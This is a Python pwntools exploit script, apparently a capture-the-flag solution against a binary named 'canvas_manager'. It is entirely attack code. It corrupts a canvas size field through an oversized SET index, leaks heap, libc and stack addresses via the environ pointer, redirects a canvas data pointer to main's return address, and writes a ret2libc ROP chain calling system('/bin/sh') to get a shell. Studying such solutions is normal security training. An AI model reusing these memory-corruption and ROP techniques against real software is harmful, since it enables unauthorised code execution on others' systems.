#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('./canvas_manager')

gs = """
b *main
continue
"""
io = gdb.debug(elf.path, gdbscript=gs) if args.GDB else process()

def cmd(data:bytes, line=True):
    if line:
        io.recvline()
    io.sendline(data)

libc = elf.libc
context.log_level = 'info'

# In a 50x50 canvas this payload will overwrite height field to 0xffffff
# SET 1 42 8589934591 0xffffff
cmd(b'CREATE 1 50 50')
cmd(b'CREATE 2 20 20')
cmd(b'CREATE 3 20 20')
cmd(b'DELETE 2')
cmd(b'SET 1 42 8589934591 0x340000')

cmd(b'GET 1')

# 2517 à 2519
for i in range(2507):
    io.recvuntil(b'0x')

data = bytes.fromhex(io.recvline().decode().replace(',', '').replace('0x','')[:-2])
heap_base = unpack(data[2:10]) << 12
libc_leak = unpack(data[34:42])
libc.address = libc_leak - 0x1edcc0

info("libc @ " + hex(libc.address))
info("heap @ " + hex(heap_base))

# Unlimited size write
cmd(b'SET 1 42 8589934591 0xffffff', line=False)

# offset is 0x2250 bytes to overwrite BLOCK 3's content ptr
info("target #1 => environ ptr @ " + hex(libc.sym['environ']))
target = unpack(pack(libc.sym["environ"]), endianness='big')
block1 = (target >> 40) & 0xffffff
block2 = (target >> 16) & 0xffffff

cmd(f'SET 1 2928 0 {hex(block1)}'.encode())
cmd(f'SET 1 2929 0 {hex(block2)}'.encode())
cmd(b'GET 3')

io.recvline()
data = bytes.fromhex(io.recvline().decode().replace(',', '').replace('0x','')[1:-2])
stack_leak = unpack(data[:8])
main_ret = stack_leak - 0x140

info("stack env @ " + hex(stack_leak))
info("main ret @ " + hex(main_ret))

info("target #2 => main ret @ " + hex(main_ret))
target = unpack(pack(main_ret), endianness='big')
block1 = (target >> 40) & 0xffffff
block2 = (target >> 16) & 0xffffff
cmd(f'SET 1 2928 0 {hex(block1)}'.encode(), line=False)
cmd(f'SET 1 2929 0 {hex(block2)}'.encode())

# now canvas 3's content is located at the main return address on the stack, allowing us to perform a rop chain
# let's make a payload writer loop
pop_rdi = libc.address + 0x2d7a2
ret = libc.address + 0x2c495
binsh = next(libc.search(b'/bin/sh\x00'))
payload = flat({
    0: [
        pop_rdi, binsh,
        ret,
        libc.sym["system"]
    ]
})
for i in range(0, len(payload), 3):
    block = unpack(payload[i:i+3][::-1].ljust(8, b'\x00')) & 0xffffff
    idx = i//3
    cmd(f'SET 3 {idx} 0 0x{block:06x}'.encode())

cmd(b'EXIT')

io.interactive()
